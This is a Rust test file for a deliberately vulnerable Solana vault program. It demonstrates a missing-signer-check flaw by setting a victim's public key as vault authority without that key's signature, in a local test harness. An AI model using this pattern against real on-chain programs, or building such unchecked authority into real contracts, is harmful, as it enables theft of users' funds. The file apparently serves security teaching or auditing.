use borsh::{BorshDeserialize, BorshSerialize};
use solana_program_test::*;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use vulnerable_smart_contract::{Vault, VaultInstruction};

fn program_id() -> Pubkey {
    "Vu11111111111111111111111111111111111111111"
        .parse()
        .unwrap()
}

#[tokio::test]
async fn test_missing_signer_check() {
    let program_id = program_id();
    let mut program_test = ProgramTest::new(
        "vulnerable_smart_contract",
        program_id,
        processor!(vulnerable_smart_contract::process_instruction),
    );

    let victim_pubkey = Pubkey::new_unique(); // private key yok
    let vault = Keypair::new();

    program_test.add_account(
        vault.pubkey(),
        Account {
            lamports: 1_000_000,
            data: vec![0u8; Vault::SIZE],
            owner: program_id,
            executable: false,
            rent_epoch: 0,
        },
    );

    let (mut banks_client, payer, recent_blockhash) = program_test.start().await;

    // authority is victim and is_signer: false
    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(vault.pubkey(), false),
            AccountMeta::new_readonly(victim_pubkey, false),
        ],
        data: VaultInstruction::Initialize.try_to_vec().unwrap(),
    };

    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&payer.pubkey()),
        &[&payer],
        recent_blockhash,
    );

    let result = banks_client.process_transaction(tx).await;

    assert!(result.is_ok(), "Crash: {:?}", result);

    let vault_account = banks_client
        .get_account(vault.pubkey())
        .await
        .unwrap()
        .unwrap();

    let vault_data = Vault::try_from_slice(&vault_account.data).unwrap();

    println!(
        "vault.authority = {} same with victim key {}",
        vault_data.authority, victim_pubkey
    );
}
